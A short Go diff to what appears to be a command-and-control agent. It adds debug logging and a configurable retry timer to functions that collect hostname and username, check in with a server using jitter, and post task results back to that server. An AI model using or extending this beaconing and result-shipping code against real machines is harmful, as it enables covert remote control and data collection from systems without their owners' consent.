@@ -70,6 +70,9 @@ func GatherInfo() InitialInfo {
 		Callback_freq: agent_config.CallbackVal,
 		Jitter:        agent_config.JitterVal,
 	}
+	if debug.Debug {
+		fmt.Printf("[*] Gathered initial info: session: %s, hostname: %s, username: %s\n", hostInfo.Session, hostInfo.Hostname, hostInfo.Username)
+	}
 	return hostInfo
 }
 
@@ -84,7 +87,7 @@ func InitialCheckin(serverUrl string, initialInfo InitialInfo) {
 		}
 		if err != nil || resp != 200 {
 
-			time.Sleep(60 * time.Second)
+			time.Sleep(time.Duration(agent_config.RetryTimerVal) * time.Second)
 		} else {
 			return
 		}
@@ -188,6 +191,11 @@ func DataShipper(serverUrl string, taskData map[string]interface{}, results stri
 		Task:      taskData["task"].(string),
 		Args:      encodedArgs,
 		Results:   encodedOutput,
+	}
+	if debug.Debug {
+		fmt.Printf("[*] Shipping results for task: %s\n", taskData["task"])
+		fmt.Printf("[*] Args: %s\n", taskData["args"])
+		fmt.Printf("[*] Results: %s\n", results)
 	}
 	_, _ = PostJson(serverUrl, result)
 
